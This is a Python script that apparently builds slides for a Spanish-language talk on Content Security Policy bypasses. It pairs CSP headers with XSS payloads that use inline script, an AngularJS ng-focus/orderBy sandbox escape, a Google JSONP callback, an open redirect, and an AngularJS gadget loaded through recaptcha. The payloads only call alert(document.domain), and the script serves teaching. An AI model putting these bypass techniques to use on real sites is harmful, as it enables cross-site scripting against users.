from pathlib import Path
from jinja2 import Template
from textwrap import dedent

BASE_PATH = Path(__file__).parent


def get_examples():
    csp = "script-src 'self' 'unsafe-inline' 'unsafe-eval' https://*.google.com https://*.gstatic.com https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js;"
    example_01 = {
        "title": "CSP bypass usando inline JS",
        "csp": csp,
        "vulnerable": True,
        "payload": dedent(
            """
            <script>
              alert(document.domain)
            </script>
            """
        ).strip("\n"),
    }

    csp = csp.replace("'unsafe-inline' ", "")
    example_02 = {
        **example_01,
        "vulnerable": False,
        "csp": csp,
    }

    example_03 = {
        "title": "CSP bypass usando AngularJS",
        "csp": csp,
        "vulnerable": True,
        "payload": dedent(
            """
            <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"></script>

            <div ng-app ng-csp>
              <input ng-focus="$event.composedPath()|orderBy:'alert(document.domain)'" value="Click me!">
            </div>
            """
        ).strip("\n"),
    }

    csp = csp.replace("'unsafe-eval' ", "").replace(
        "https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js",
        "https://cdn.jsdelivr.net/npm/jquery@3.6.4/dist/jquery.min.js",
    )
    example_04 = {
        **example_03,
        "vulnerable": False,
        "csp": csp,
    }

    example_05 = {
        "title": "CSP bypass usando JSONP",
        "csp": csp,
        "vulnerable": True,
        "payload": dedent(
            """
            <script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(document.domain)"></script>
            """
        ).strip("\n"),
    }

    csp = csp.replace("https://*.google.com", "https://www.google.com/recaptcha/")
    csp = csp.replace("https://*.gstatic.com", "https://www.gstatic.com/recaptcha/")
    example_06 = {
        **example_05,
        "vulnerable": False,
        "csp": csp,
    }

    example_07 = {
        "title": "CSP bypass usando un open redirect",
        "csp": csp,
        "vulnerable": True,
        "payload": dedent(
            """
            <script src="/_/redirect/?https://cdn.jsdelivr.net/gh/stsewd/charla-csp-xss@main/js/test.js"></script>
            """
        ).strip("\n"),
    }

    example_0x = {
        "title": "CSP bypass, AngularJS está de vuelta!",
        "csp": csp,
        "vulnerable": True,
        "payload": dedent(
            """
            <script src='https://www.google.com/recaptcha/about/js/main.min.js'></script>

            <div ng-app ng-csp>
              <input ng-focus="$event.composedPath()|orderBy:'alert(document.domain)'" value="Click me!">
            </div>
            """
        ).strip("\n"),
    }

    return [
        example_01,
        example_02,
        example_03,
        example_04,
        example_05,
        example_06,
        example_07,
        example_0x,
    ]


def get_template(name):
    content = (BASE_PATH / name).read_text()
    return Template(content, autoescape=True)


def main():
    examples = get_examples()
    total = len(examples)
    for i, example in enumerate(examples):
        section_id = f"{i+1:02d}"
        current_example = f"{section_id}.html"
        prev_example = None
        next_example = None
        if i > 0:
            prev_example = f"{i:02d}.html"
        if i < total - 1:
            next_example = f"{i+2:02d}.html"

        context = {
            "section_id": section_id,
            "current_example": current_example,
            "prev_example": prev_example,
            "next_example": next_example,
            **example,
        }

        template = get_template("template.html")
        output = template.render(**context)
        (BASE_PATH / f"../examples/{section_id}.html").write_text(output)


if __name__ == "__main__":
    main()
